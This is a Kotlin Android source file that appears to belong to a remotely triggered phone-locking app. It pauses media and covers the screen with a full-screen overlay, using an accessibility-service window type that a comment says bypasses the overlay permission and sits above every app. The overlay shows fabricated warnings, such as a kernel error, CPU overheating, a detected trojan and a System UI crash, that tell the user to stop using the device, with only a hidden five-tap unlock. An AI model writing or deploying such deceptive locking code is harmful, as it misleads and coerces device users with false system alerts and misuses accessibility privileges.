package com.dwisnulabs.agent

import android.content.Context
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.media.AudioAttributes
import android.media.AudioFocusRequest
import android.media.AudioManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import android.view.KeyEvent
import android.view.View
import android.view.WindowManager
import android.widget.LinearLayout
import android.widget.TextView

object LockOverlayManager {
    private const val TAG = "DwisnuLabsLockOverlay"
    private var overlayView: View? = null
    private var activeWindowManager: WindowManager? = null
    private val mainHandler = Handler(Looper.getMainLooper())

    private var currentThemeShowing: ScareTheme? = null

    fun isShowing(): Boolean = AppState.isLocked

    fun show(context: Context) {
        AppState.isLocked = true

        mainHandler.post {
            // Step 1: Pause any active audio/video (e.g. YouTube, TikTok, Games) immediately
            pauseMediaPlayback(context)

            // Step 2: Full-Screen Intent Notification (Android 10-14 & HyperOS system wake-up)
            try {
                DwisnuLabsLockService.triggerLockFullScreenIntent(context)
            } catch (e: Exception) {
                Log.e(TAG, "Error triggering full screen notification: ${e.message}")
            }

            // Step 3: Launch Fullscreen Scare Activity
            try {
                ScareActivity.start(context)
            } catch (e: Exception) {
                Log.e(TAG, "Error starting ScareActivity directly: ${e.message}")
            }

            // Step 4: System Window Overlay (The unbreakable shield)
            // Priority 1: Use AccessibilityService with TYPE_ACCESSIBILITY_OVERLAY (Bypasses SYSTEM_ALERT_WINDOW requirement & sits above PiP/YouTube)
            // Priority 2: Use Context WindowManager with TYPE_APPLICATION_OVERLAY
            val a11y = DwisnuLabsAccessibilityService.instance
            val (wm, windowType) = when {
                a11y != null -> {
                    Log.d(TAG, "Using TYPE_ACCESSIBILITY_OVERLAY via AccessibilityService (Overlays all windows including PiP).")
                    Pair(a11y.getSystemService(Context.WINDOW_SERVICE) as WindowManager, WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY)
                }
                Settings.canDrawOverlays(context) -> {
                    Log.d(TAG, "Using TYPE_APPLICATION_OVERLAY via system WindowManager.")
                    val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    } else {
                        @Suppress("DEPRECATION")
                        WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
                    }
                    Pair(context.getSystemService(Context.WINDOW_SERVICE) as WindowManager, type)
                }
                else -> {
                    Log.w(TAG, "Neither AccessibilityService nor SYSTEM_ALERT_WINDOW available. Falling back to ScareActivity.")
                    Pair(null, 0)
                }
            }

            if (wm == null) {
                return@post
            }

            // If already attached to window with same theme, do nothing
            if (overlayView != null && overlayView?.isAttachedToWindow == true && currentThemeShowing == AppState.scareTheme) {
                return@post
            }

            // Clean up existing overlay before re-adding
            safelyRemoveOverlay()

            try {
                activeWindowManager = wm

                val layoutParams = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    windowType,
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                    PixelFormat.TRANSLUCENT
                ).apply {
                    gravity = Gravity.CENTER
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
                    }
                }

                currentThemeShowing = AppState.scareTheme
                val targetContext = a11y ?: context
                overlayView = createScareView(targetContext)
                wm.addView(overlayView, layoutParams)
                Log.d(TAG, "Scare Lock Overlay displayed successfully (Type: $windowType, Theme: ${AppState.scareTheme.name}).")
            } catch (e: Exception) {
                Log.e(TAG, "Error displaying lock overlay: ${e.message}", e)
            }
        }
    }

    fun hide(context: Context? = null) {
        AppState.isLocked = false

        mainHandler.post {
            // Close ScareActivity
            try {
                ScareActivity.instance?.finish()
            } catch (e: Exception) {
                Log.e(TAG, "Error finishing ScareActivity: ${e.message}")
            }

            // Cancel Alert Notification
            if (context != null) {
                DwisnuLabsLockService.cancelLockNotification(context)
            }

            // Remove Overlay View
            safelyRemoveOverlay()
        }
    }

    private fun safelyRemoveOverlay() {
        val view = overlayView
        val wm = activeWindowManager ?: (DwisnuLabsAccessibilityService.instance?.getSystemService(Context.WINDOW_SERVICE) as? WindowManager)
        if (view != null && wm != null) {
            try {
                if (view.isAttachedToWindow) {
                    wm.removeViewImmediate(view)
                } else {
                    wm.removeView(view)
                }
                Log.d(TAG, "Lock overlay removed.")
            } catch (e: Exception) {
                Log.w(TAG, "Safe removeView: ${e.message}")
            }
        }
        overlayView = null
        activeWindowManager = null
        currentThemeShowing = null
    }

    private fun pauseMediaPlayback(context: Context) {
        try {
            val am = context.getSystemService(Context.AUDIO_SERVICE) as? AudioManager ?: return
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val audioAttributes = AudioAttributes.Builder()
                    .setUsage(AudioAttributes.USAGE_MEDIA)
                    .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
                    .build()
                val focusRequest = AudioFocusRequest.Builder(AudioManager.AUDIOFOCUS_GAIN_TRANSIENT)
                    .setAudioAttributes(audioAttributes)
                    .build()
                am.requestAudioFocus(focusRequest)
            } else {
                @Suppress("DEPRECATION")
                am.requestAudioFocus(null, AudioManager.STREAM_MUSIC, AudioManager.AUDIOFOCUS_GAIN_TRANSIENT)
            }

            val downEvent = KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_MEDIA_PAUSE)
            val upEvent = KeyEvent(KeyEvent.ACTION_UP, KeyEvent.KEYCODE_MEDIA_PAUSE)
            am.dispatchMediaKeyEvent(downEvent)
            am.dispatchMediaKeyEvent(upEvent)
        } catch (e: Exception) {
            Log.w(TAG, "Error pausing media playback: ${e.message}")
        }
    }

    private fun createScareView(context: Context): View {
        val root = LinearLayout(context).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.BLACK)
            gravity = Gravity.CENTER
            setPadding(48, 48, 48, 48)
            isClickable = true
            isFocusable = true
        }

        val theme = AppState.scareTheme

        val titleView = TextView(context).apply {
            textSize = 20f
            typeface = Typeface.MONOSPACE
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 32)
        }

        val descView = TextView(context).apply {
            textSize = 15f
            typeface = Typeface.MONOSPACE
            gravity = Gravity.CENTER
            setLineSpacing(1.2f, 1.2f)
            setPadding(0, 0, 0, 48)
        }

        val instructionView = TextView(context).apply {
            textSize = 14f
            typeface = Typeface.MONOSPACE
            gravity = Gravity.CENTER
        }

        when (theme) {
            ScareTheme.SYSTEM_ERROR -> {
                titleView.text = "⚠️ [CRITICAL SYSTEM ERROR 0x8849F]"
                titleView.setTextColor(Color.parseColor("#FF5252"))
                descView.text = "KERNEL_SECURITY_CHECK_FAILURE\nInternal storage block corrupted due to excessive load.\n\nSistem dinonaktifkan sementara untuk mencegah kerusakan permanen pada memori internal dan chipset."
                descView.setTextColor(Color.parseColor("#FFD54F"))
                instructionView.text = "DIANJURKAN: Diamkan perangkat selama 45–60 menit dalam kondisi dingin dan jangan dinyalakan!"
                instructionView.setTextColor(Color.WHITE)
            }
            ScareTheme.OVERHEAT -> {
                titleView.text = "🔥 [HARDWARE TEMPERATURE: 88°C]"
                titleView.setTextColor(Color.parseColor("#FF1744"))
                descView.text = "CRITICAL CPU & BATTERY OVERHEAT DETECTED.\nSuhu prosesor melampaui batas toleransi aman.\n\nRisiko degradasi baterai dan kerusakan hardware permanen."
                descView.setTextColor(Color.parseColor("#FF9100"))
                instructionView.text = "PERINGATAN: Perangkat dimatikan otomatis untuk pendinginan darurat. Jangan digunakan!"
                instructionView.setTextColor(Color.WHITE)
            }
            ScareTheme.SECURITY_THREAT -> {
                titleView.text = "🛡️ [ANDROID SECURITY PROTOCOL]"
                titleView.setTextColor(Color.parseColor("#FF3D00"))
                descView.text = "SUSPICIOUS EXPLOIT / TROJAN THREAT DETECTED.\nAktivitas jaringan berbahaya terdeteksi di perangkat ini.\n\nSistem telah mengisolasi akses aplikasi dan input untuk mencegah kebocoran data."
                descView.setTextColor(Color.parseColor("#80D8FF"))
                instructionView.text = "Sistem dalam mode karantina keamanan. Silakan tutup dan letakkan perangkat."
                instructionView.setTextColor(Color.WHITE)
            }
            ScareTheme.FAKE_CRASH -> {
                titleView.text = "❌ [SYSTEM UI HAS STOPPED]"
                titleView.setTextColor(Color.WHITE)
                descView.text = "Proses com.android.systemui tidak merespons.\nTerjadi kegagalan render tampilan antarmuka (Error 503)."
                descView.setTextColor(Color.LTGRAY)
                instructionView.text = "Silakan diamkan perangkat beberapa saat."
                instructionView.setTextColor(Color.GRAY)
            }
        }

        // Secret Emergency Unlock: Tap title 5 times rapidly
        var tapCount = 0
        var lastTapTime = 0L
        titleView.setOnClickListener {
            val now = System.currentTimeMillis()
            if (now - lastTapTime < 800) {
                tapCount++
                if (tapCount >= 5) {
                    hide(context)
                    FirebaseDeviceManager.syncStatus(context)
                }
            } else {
                tapCount = 1
            }
            lastTapTime = now
        }

        root.addView(titleView)
        root.addView(descView)
        root.addView(instructionView)

        return root
    }
}
